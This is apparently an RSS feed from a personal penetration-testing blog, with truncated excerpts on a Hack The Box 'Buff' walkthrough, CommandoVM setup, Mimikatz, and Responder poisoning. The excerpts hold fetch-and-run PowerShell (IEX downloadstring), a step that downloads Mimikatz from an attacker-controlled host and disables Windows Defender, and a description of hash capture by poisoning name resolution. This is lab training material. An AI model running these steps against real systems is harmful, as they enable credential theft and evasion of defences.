channel.title: uncomplete on Poney Island
channel.description: Recent content in uncomplete on Poney Island

item.title: HTB - Buff
item.description: nmap _ buff nmap -p- -T4 --min-rate=3000 10.10.10.198 -Pn PORT STATE SERVICE 8080/tcp open http-proxy _ buff nmap -sC -sV -Pn -p8080 10.10.10.198 PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut gobuster _ buff gobuster dir -u http://10.10.10.198:8080/ -w /opt/dictionaries/common.txt Nothing special can be found going to http://10.10.10.198:8080/contact.php, we can read : Made using Gym Management Software 1.

item.title: CommandoVM Preparation
item.description: prepare your windowsVM Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html Reboot Snapshot your VM : “Before-Commando-VM” Set-ExecutionPolicy Unrestricted Install CommandoVM Download and Execute Commander VM by Mandiant IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1') Failed to install cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.fireeye Directory C:\Users\User\AppData\Local\ChocoCache cannot be removed because it is not empty. successfully reinstalled with cinst openvpn flare-floss.fireeye fuzzdb.fireeye dnsrecon.

item.title: Mimikatz
item.description: Identification of the processor architecture PS C:\users\administrator\Music> $env:PROCESSOR_ARCHITECTURE AMD64 Upload mimikatz wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/ We download Mimikatz and execute after having disabled Windows Defender PS C:\users\administrator\Music> iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music> Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music> ./mimikatz.exe exit output: .#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .## ^ ##. "A La Vie, A L'Amour" - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.

item.title: Responder
item.description: what is responder Responder is basically a lyer or a poisoner … there is a ton of broadcasted or multicast messages on the network such as those protocols: LLMNR - Link-Local Multicast Name Resolution [NBT-NS - NetBIOS Name Service] [mDNS] When those resolution protocols broadcast the network asking “Where is machine A?”, responder will pretend “Hey, it’s me!” and the remote machine will starts to talk with responder sharing some windows hashes and otherthings that can be:
